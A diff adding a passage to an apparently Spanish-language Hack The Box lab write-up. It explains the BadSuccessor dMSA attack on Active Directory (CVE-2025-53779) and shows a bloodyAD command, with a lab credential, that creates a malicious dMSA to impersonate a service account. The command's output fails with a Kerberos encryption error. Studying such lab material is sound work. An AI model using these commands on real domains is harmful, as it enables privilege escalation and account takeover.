@@ -1027,3 +1027,77 @@ Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 20
 PS C:\Program Files\Microsoft VS Code>
 
 ```
+
+Tenemos el ataque de badsuccessor sin parchear, el cual consiste en migrar una nueva cuenta de servicio de windows mediante la funcion dMSA a una nueva cuenta que hereda la identidad de la cuenta que estamos migrando.
+
+dMSA se utiliza para migrar cuentas de servicio, para que dejen de usar contraseña y pasen al nuevo metodo moderno implantado por AD el cual el se encarga de gestionar la contraseña y cambiarla periodicamente sin que los usuarios ni administradores sepan la contraseña directamente. Todo gestionado por AD.
+
+En este punto entra la vuln Badsuccessor, si un usuario del dominio tiene permisos para CREATE_CHILD (CC) sobre cualquier OU del dominio y la vulnerabilidad (CVE-2025-53779) no esta parcheada en la maquina, se puede crear un dMSA malicioso y luego poder pedir su ticket kerberos.
+
+Incluso si CVE-2025-53779 esta parcheado en el objetivo, se puede llegar a acontecer la vulnerabilidad con el sistema completamente actualizado. Se necesitan cumplir estas condiciones:  
+- Usuario comprometido el cual tenga permisos CREATE_CHILD (CC) en almenos 1 OU del dominio
+- Usuario comprometido con permiso WRITE en el objeto de la cuenta de servicio a la que queremos comprometer.
+
+En nuestro caso, tenemos ambos casos, tenemos a alex, el cual puede crear CREATE_CHILD en "Employees" y por otro lado tenemos a ryan, el cual tiene permiso WRITE bajo el objeto de tipo user svc_deploy
+
+En este caso la vulnerabilidad badsuccessor no esta parcheada, por lo cual usaremos el metodo 1 (CVE-2025-53779) debido a que es mas sencillo , ya que solo tenemos que hacer 1 de los dos pasos que se requeririan si la vuln estuviera parcheada.
+
+``` bash
+
+❯ bloodyAD --host dc01.checkpoint.htb --dc-ip 10.129.113.22 -d checkpoint.htb -u alex.turner -p 'Checkpoint2024!' add badSuccessor svc_pwn -t 'CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb' --ou 'OU=Employees,DC=checkpoint,DC=htb' --prepatch
+[+] Creating DMSA svc_pwn$ in OU=Employees,DC=checkpoint,DC=htb
+[+] Impersonating: CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
+[-] Failed to retrieve dMSA TGT
+[-] Try using Rubeus, or something like:
+[-] badS4U2self 'kerberos+pw://checkpoint.htb\alex.turner:Checkpoint2024%21@10.129.113.22/' 'krbtgt/checkpoint.htb@checkpoint.htb' 'svc_pwn$@checkpoint.htb' --dmsa
+Traceback (most recent call last):
+  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 313, in get_TGT
+    preauth_rep = self.do_preauth(etype, with_pac=with_pac)
+  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 189, in do_preauth
+    rep = self.ksoc.sendrecv(req.dump())
+  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/network/clientsocket.py", line 85, in sendrecv
+    raise KerberosError(krb_message)
+kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail: "KDC has no support for encryption type"
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/home/joel/.local/bin/bloodyAD", line 6, in <module>
+    sys.exit(main())
+             ~~~~^^
+  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
+    asyncio.run(amain())
+    ~~~~~~~~~~~^^^^^^^^^
+  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
+    return runner.run(main)
+           ~~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
+    return self._loop.run_until_complete(task)
+           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
+  File "/usr/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
+    return future.result()
+           ~~~~~~~~~~~~~^^
+  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
+    output = await result
+             ^^^^^^^^^^^^
+  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 195, in badSuccessor
+    raise e
+  File "/home/joel/.local/lib/python3.13/site-packages/bloodyAD/cli_modules/add.py", line 186, in badSuccessor
+    tgs, encTGSRepPart, key = client.with_clock_skew(client.S4U2self, target_user, service_spn, is_dmsa=True)
+                              ~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 845, in with_clock_skew
+    return func(*args, **kwargs)
+  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 556, in S4U2self
+    self.get_TGT()
+    ~~~~~~~~~~~~^^
+  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 323, in get_TGT
+    preauth_rep = self.do_preauth(srv_etype, with_pac=with_pac)
+  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/client.py", line 189, in do_preauth
+    rep = self.ksoc.sendrecv(req.dump())
+  File "/home/joel/.local/lib/python3.13/site-packages/kerbad/network/clientsocket.py", line 85, in sendrecv
+    raise KerberosError(krb_message)
+kerbad.protocol.errors.KerberosError:  Error Name: KDC_ERR_ETYPE_NOTSUPP Detail: "KDC has no support for encryption type"
+╭─ ~/hacking/ctf/htb/medium/checkpoint/scripts                                                               1 х ─╮
+╰─                                                                                                               ─╯
+
+```
